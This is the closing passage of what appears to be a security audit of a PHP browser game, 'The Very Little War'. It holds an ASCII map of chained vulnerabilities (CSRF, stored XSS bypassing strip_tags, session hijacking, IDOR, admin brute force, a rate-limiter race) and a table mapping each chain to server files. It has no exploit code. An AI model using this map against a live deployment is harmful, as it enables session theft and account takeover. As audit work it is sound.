    +-------v------+  +-----v------+  +------v-------+
    | CHAIN-01:    |  | CHAIN-02:  |  | CHAIN-06:    |
    | voter.php    |  | Stored XSS |  | Admin Brute  |
    | GET CSRF     |  | alliance   |  | Force        |
    +-------+------+  +-----+------+  +------+-------+
            |                |                |
    +-------v------+  +-----v------+  +------v-------+
    | CHAIN-07:    |  | Session    |  | Admin Access |
    | IP Tracking  |  | Hijack     +--+              |
    +--------------+  +-----+------+  +------+-------+
                            |                |
                      +-----v----------------v-------+
                      |         CHAIN-05:            |
                      | Admin News Stored XSS        |
                      | strip_tags <img onerror>     |
                      +-----+------------------------+
                            |
                      +-----v------------------------+
                      | TERMINAL: Universal Player   |
                      | Session Theft, Full Game      |
                      | Compromise                   |
                      +------------------------------+

    INDEPENDENT CHAINS:
    +------------------+     +------------------+
    | CHAIN-03:        |     | CHAIN-04:        |
    | Invitation Theft |     | Message IDOR     |
    | -> Infiltration  |     | -> Intelligence  |
    +------------------+     +------------------+

    +------------------+
    | CHAIN-08:        |
    | Weak Password +  |
    | Rate Limiter     |
    | -> Account       |
    | Takeover         |
    +------------------+
```

---

## Key Files Referenced

| File | Path | Role in Chains |
|------|------|---------------|
| bbcode.php | `/home/guortates/TVLW/The-Very-Little-War/includes/bbcode.php` | [img] tag rendering (CHAIN-01, 07) |
| voter.php | `/home/guortates/TVLW/The-Very-Little-War/voter.php` | GET CSRF endpoint (CHAIN-01) |
| allianceadmin.php | `/home/guortates/TVLW/The-Very-Little-War/allianceadmin.php` | Grade XSS input, tag change (CHAIN-02) |
| alliance.php | `/home/guortates/TVLW/The-Very-Little-War/alliance.php` | XSS render, invitation theft (CHAIN-02, 03) |
| ui_components.php | `/home/guortates/TVLW/The-Very-Little-War/includes/ui_components.php` | Grade XSS render (CHAIN-02) |
| admin/index.php | `/home/guortates/TVLW/The-Very-Little-War/admin/index.php` | Shared session, admin auth (CHAIN-02, 05, 06) |
| index.php | `/home/guortates/TVLW/The-Very-Little-War/index.php` | News XSS render (CHAIN-05) |
| maintenance.php | `/home/guortates/TVLW/The-Very-Little-War/maintenance.php` | News XSS render (CHAIN-05) |
| ecriremessage.php | `/home/guortates/TVLW/The-Very-Little-War/ecriremessage.php` | Message IDOR (CHAIN-04) |
| rapports.php | `/home/guortates/TVLW/The-Very-Little-War/rapports.php` | strip_tags render (CHAIN-09) |
| rate_limiter.php | `/home/guortates/TVLW/The-Very-Little-War/includes/rate_limiter.php` | TOCTOU race (CHAIN-06, 08) |
| inscription.php | `/home/guortates/TVLW/The-Very-Little-War/inscription.php` | No password policy (CHAIN-08) |
| csrf.php | `/home/guortates/TVLW/The-Very-Little-War/includes/csrf.php` | CSRF infrastructure (all chains) |
| session_init.php | `/home/guortates/TVLW/The-Very-Little-War/includes/session_init.php` | Session config (CHAIN-02, 05) |

---

*End of cross-domain attack chain analysis. 9 chains identified, 2 CRITICAL, 3 HIGH, 4 MEDIUM.*
